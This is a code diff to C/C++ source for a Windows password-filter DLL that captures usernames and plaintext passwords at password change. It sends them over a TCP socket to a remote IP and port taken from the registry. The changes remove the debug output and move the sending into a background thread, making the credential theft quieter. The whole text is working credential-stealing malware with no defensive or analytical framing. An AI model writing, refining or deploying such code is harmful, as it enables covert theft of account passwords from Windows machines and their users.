@@ -1,6 +1,4 @@
 #include "lsanotif.h"
-#include "pch.h"
-
 
 int sendCreds(char* creds)
 {
@@ -11,49 +9,26 @@ int sendCreds(char* creds)
 	char* ip = getIPReg(L"ipa");
 	DWORD port = getPtReg();
 
-	printf("\nInitialising Winsock...");
-	if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0)
-	{
-		printf("Failed. Error Code : %d", WSAGetLastError());
-		return 1;
-	}
-
-	printf("Initialised.\n");
+	if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) { return 1; }
 
 	//Create a socket
-	if ((s = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET)
-	{
-		printf("Could not create socket : %d", WSAGetLastError());
-		goto error;
-	}
-
-	printf("Socket created.\n");
+	if ((s = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET) { goto error; }
 
 	server.sin_addr.s_addr = inet_addr(ip);
 	server.sin_family = AF_INET;
 	server.sin_port = htons(port);
 
-	//Connect to remote server
-	if (connect(s, (struct sockaddr*)&server, sizeof(server)) < 0)
-	{
-		puts("connect error");
-		goto error;
-	}
+	if (connect(s, (struct sockaddr*)&server, sizeof(server)) < 0) { goto error; }
 
-	puts("Connected");
+	if (send(s, creds, strlen(creds), 0) < 0) { goto error; }
 
-	//Send some data
-	if (send(s, creds, strlen(creds), 0) < 0)
-	{
-		puts("Send failed");
-		goto error;
-	}
-	puts("Data Send\n");
-
+	free(creds);
 	free(ip);
+	WSACleanup();
 	return 0;
 
 error:
+	free(creds);
 	free(ip);
 	WSACleanup();
 	return 1;
@@ -67,14 +42,12 @@ void SavePassword(PUNICODE_STRING username, PUNICODE_STRING password)
 
 	sprintf(creds, "%ws:%ws;end;%s", username->Buffer, password->Buffer, eip);
 
-	int retval = sendCreds(creds);
-
+	CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)&sendCreds, creds, 0, NULL);
+	
 	free(eip);
-	free(creds);
 }
 
 
-// EXPORTS
 extern "C" __declspec(dllexport)
 BOOL WINAPI InitializeChangeNotify(void)
 {
